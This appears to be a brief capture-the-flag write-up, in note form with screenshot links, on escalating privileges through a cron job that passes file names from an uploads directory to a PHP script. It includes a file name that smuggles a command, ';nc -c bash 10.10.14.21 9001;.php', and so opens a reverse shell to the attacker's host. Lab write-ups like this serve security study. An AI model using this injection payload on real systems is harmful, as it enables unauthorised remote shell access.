# Getting Root
cronjob every 3 minutes
![[Pasted image 20211202130349.png]]

Analyzing the code of check_attack_php, we can control the variable $value
![[Pasted image 20211202125700.png]]

we can escape the command and pipe or command with ';' after $path

Running  on uploads directory
```bash
touch -- ';nc -c bash 10.10.14.21 9001;.php'
```
![[Pasted image 20211202130532.png]]

Shell as guly
![[Pasted image 20211202130618.png]]

```bash
sudo -l
```
![[Pasted image 20211202131746.png]]
Permit space, can use space to run command?

![[Pasted image 20211202132055.png]]